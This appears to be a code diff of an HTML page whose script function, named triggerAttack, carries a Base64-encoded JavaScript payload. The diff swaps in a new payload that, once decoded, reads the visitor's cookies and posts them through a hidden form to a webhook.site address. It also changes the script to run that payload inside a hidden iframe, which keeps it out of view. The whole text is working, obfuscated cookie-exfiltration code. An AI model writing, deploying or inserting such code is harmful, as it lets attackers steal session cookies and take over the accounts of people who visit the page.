@@ -20,18 +20,22 @@
 
     <script>
         function triggerAttack() {
-            // Base64 encoded payload to run when the button is clicked
-            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO3Byb3BzKGZpc2NoLCB7IG1ldGhvZDogJ1BPU1QnLCBhY3Rpb246ICdodHRwczovL3dlYmhvb2suc2l0ZS84Y2ZmZjNhYS0zM2E3LTQ0ZDMtOWRlMS04NmZkMjliMDk2N2IvcmVjZWl2ZS1jb29raWVzJyB9KTs=';
+            // Replace this with your new Base64 encoded payload
+            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2Zpc2NoLm1ldGhvZCA9ICdQT1NUJztmaXNjaC5hY3Rpb24gPSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvOGNmZmYzYWEtMzNhNy00NGQzLTlkZTEtODZmZDI5YjA5NjdiJzt2YXIgaW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpO2lucHV0LnR5cGUgPSAnaGlkZGVuJztpbnB1dC5uYW1lID0gJ2Nvb2tpZURhdGEnOwppbnB1dC52YWx1ZSA9IGRvY3VtZW50LmNvb2tpZTtmaXNjaC5hcHBlbmRDaGlsZChpbnB1dCk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmaXNjaCk7IGZpc2NoLnN1Ym1pdCgpOw==';
             
             // Decode the Base64 encoded payload
             var decodedPayload = atob(encodedPayload);
-            
-            // Create a script element
-            var script = document.createElement('script');
-            script.textContent = decodedPayload; // Inject decoded script content
-            
-            // Append the script to the body
-            document.body.appendChild(script);
+
+            // Create an iframe element
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none'; // Hide the iframe from view
+            document.body.appendChild(iframe);
+
+            // Write the decoded script into the iframe
+            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            iframeDoc.open();
+            iframeDoc.write('<script>' + decodedPayload + '<\/script>');
+            iframeDoc.close();
         }
 
         // Create the button element
